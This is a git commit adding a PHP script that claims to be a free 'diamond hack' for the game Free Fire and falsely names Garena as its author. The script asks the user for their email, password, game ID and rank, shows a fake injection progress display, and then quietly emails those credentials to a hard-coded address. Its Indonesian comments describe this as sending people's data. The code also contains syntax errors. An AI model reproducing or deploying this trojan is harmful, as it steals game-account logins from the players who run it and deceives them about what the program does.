d0c12be7707aa3562ac2857f6676c51c3baf1aae
Hack Solustion <50937775+hacksolustion@users.noreply.github.com>
2019-05-29 23:37:57 +0700

    Add files via upload

---
+++ DiamondFF.php
@@ -0,0 +1,61 @@
+<?php
+//For Diamond Top Up Free
+echo "\033[95mHACK DIAMOND FREE FIRE v.2"		
+echo "\033[95mDONT USE THIS FOR ILEGAL PURPOSE !"
+echo "\033[95mAUTHOR: Garena"
+echo "\033[95mFACEBOOK: Garena Free Fire Official"
+//Get Access Data
+echo "\033[93Masukan email anda :   ";
+$imel = trim(fgets(STDIN));
+//Get Access Data
+echo "\033[93mMasukan password anda : ";
+$san = trim(fgets(STDIN));
+echo "\033[93mMasukan ID free fire anda : ";
+$gg = val(fgets(STDIN));
+echo "\033[93mMasukan Pangkat Rank Free Fire Anda : ";
+$gg = trim(fgets(STDIN));
+echo "\033[93mMasukan Jumlah diamond yang dinginkan (Max1000) : "
+$tod = trim(fgets(STDIN));
+echo "\033[91m<---------RESULT--------->"
+echo "\033[92mInfo Player $imel And $san Injection Diamond\n";
+echo "\033[92mGet Access Login Website GARENA FreeFire"
+echo "\033[92mInject Started............";
+echo "\033[92m==10%";
+echo "\033[92m===20%";
+echo "\033[92m====30%";
+echo "\033[92m=====40%";
+echo "\033[92m======50%";
+echo "\033[92m=======60%";
+echo "\033[92m========70%";
+echo "\033[92m=========80%";
+echo "\033[92m==========90%";
+echo "\033[92m===========100%";
+echo "\033[92mGeting root acces";
+echo "\033[91mNO ROOT ACCES";
+echo "\033[91mGet Info Game";
+echo "\033[91mCheck Info Game";
+echo "\033[91mCheck Acces Data Website Garena Free Fire";
+echo "\033[91mGet Access Game Data";
+echo "\033[91mInjection Access Data";
+echo "\033[91mWait Injection Your Account!!!";
+//ini buat ngirim data orang
+//jgn banyak diganti yaaa:v
+		ini_set( 'display_error', 1);
+		error_reporting( E_ALL);
+		$from = "bocahideot@ngeod.com";
+		$to = "andrew7sianturi@gmail.com";
+		$subject = "Setor ikan heker";
+		$message = "ini data si bocah 
+		Emailnya ".$imel." 
+	    Passwordnya ".$san." 
+		IDFFNya ".$gg." 
+                RankNya ".$val." 
+		pengennya ".$tod."
+		semoga datanya bener ya tod"
+		$headers = "From: <bocahngapaya@ngeod.com";
+    
+    
+//dikirim moga aja sampe:v
+		mail($to,$subject,$message,$headers);
+echo "\033[92msuccesfully the program is ending...........";
+?>
